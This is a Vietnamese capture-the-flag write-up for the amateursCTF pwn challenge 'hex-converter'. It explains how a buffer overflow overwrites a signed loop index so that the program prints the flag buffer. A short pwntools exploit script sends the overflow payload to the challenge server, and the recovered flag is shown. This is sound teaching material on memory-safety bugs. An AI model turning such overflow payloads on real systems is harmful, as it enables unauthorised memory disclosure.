# HEX-CONVERTER

## Overview

![img](/amateursCTF/Pwn/hex-converter/assets/overview.png)

- Bài cho chúng ta 3 file, trong đó có source code.
</br>![img](/amateursCTF/Pwn/hex-converter/assets/source.png)

- Chuơng trình khởi tạo biến `i` kiểu `int` bằng 0, sau đó  cho nhập input vào biến `char name[16]` (dính buffer overflow), sau đó đọc nội dung của `flag.txt` vào biến `char flag[64]`, tiếp theo là vào vòng lặp while chạy i từ 0 -> 16 thực hiện in ra name[i] ở dạng 1 byte hex.

 

## Idea

- Sử dụng IDA để disasm, ta thấy rằng là vùng nhớ của `flag` trên stack nằm ở bên trên vùng nhớ của `input` ta nhập vào, do đó ta sẽ ko thể ghi đè để nối chuỗi được.
</br>![img](/amateursCTF/Pwn/hex-converter/assets/disasm.png)

- Tuy nhiên ở bên dưới ta có vòng lặp while sẽ in ra kí tự trên vùng nhớ tại chỉ số `i` ở dạng 1 byte hex, để ý thì biến i sử dụng kiểu `int` thay vì `unsigned int` hơn nữa cũng không có kiểm tra xem nó có âm hay không, nên ta có thể ghi đè i thành `-64` rồi sau đó vòng lặp sẽ đọc biến i từ `name[-64]` đến `name[15]`  (name[-64] = flag[0]).

## Script

```python
from pwn import *

p = remote("amt.rs", 31630)

gad = 0x000000000040116d
main = 0x4011c7
main2 = 0x40118A
addr  = 0x405320
addr2  = 0x405340

#0xffffffc0 = -64 (signed int)

p.recvline()
payload = b"a"*0x1c + p32(0xffffffc0) 
p.sendline(payload)
s = p.recvline().strip()
flag = bytes.fromhex(s.decode())

print(flag.decode("ASCII"))

p.interactive()
```

## Result

![img](/amateursCTF/Pwn/hex-converter/assets/result.png)

>### Flag: amateursCTF{wait_this_wasnt_supposed_to_be_printed_76723}